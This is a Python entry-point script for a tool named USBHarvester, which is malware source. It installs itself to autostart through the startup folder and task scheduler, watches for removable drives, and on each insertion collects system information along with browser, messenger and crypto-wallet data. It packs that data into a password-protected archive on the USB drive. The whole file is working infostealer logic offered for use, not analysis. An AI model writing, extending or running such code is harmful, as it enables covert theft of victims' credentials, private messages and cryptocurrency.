import sys
import time
import threading
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent))

from core.logger import logger
from core import usb, system, packer
from grab import browsers, messengers, wallets
from persist import autostart, watcher

DUMP_ROOT = "USBHarvester_Dump"


def collect_system() -> dict:
    logger.info("collecting system info")
    return system.collect()


def collect_all(dump_dir: Path, password: str) -> Path:
    dump_dir.mkdir(parents=True, exist_ok=True)

    sysinfo = collect_system()
    system.write_report(dump_dir / "system.txt", sysinfo)

    for name, fn in [
        ("browsers", browsers.collect),
        ("messengers", messengers.collect),
        ("wallets", wallets.collect),
    ]:
        logger.info(f"collecting {name}")
        try:
            fn(dump_dir / name)
        except Exception as e:
            logger.error(f"{name} failed: {e}")

    logger.info("collection complete")
    return packer.pack(dump_dir, password=password)


def harvest_on_usb(usb_path: Path) -> None:
    host = system.hostname()
    stamp = time.strftime("%Y%m%d_%H%M%S")
    dump_dir = usb_path / f"{DUMP_ROOT}_{host}_{stamp}"
    password = f"u{stamp}h"
    try:
        archive = collect_all(dump_dir, password)
        logger.info(f"archive created: {archive}")
        logger.info(f"archive password: {password}")
    except Exception as e:
        logger.error(f"harvest failed: {e}")


def main() -> int:
    logger.info("=== USBHarvester started ===")

    # 1. self-install autostart (startup folder + task scheduler)
    try:
        autostart.install()
    except Exception as e:
        logger.error(f"autostart install failed: {e}")

    # 2. start usb watcher thread (harvest on insert)
    t = threading.Thread(target=watcher.watch, daemon=True)
    t.start()

    # 3. if usb already present at launch — harvest immediately
    drives = usb.list_removable()
    if drives:
        logger.info(f"usb present at launch: {drives[0]}")
        harvest_on_usb(drives[0])

    # 4. sleep forever, low resource
    while True:
        time.sleep(60)


if __name__ == "__main__":
    sys.exit(main())
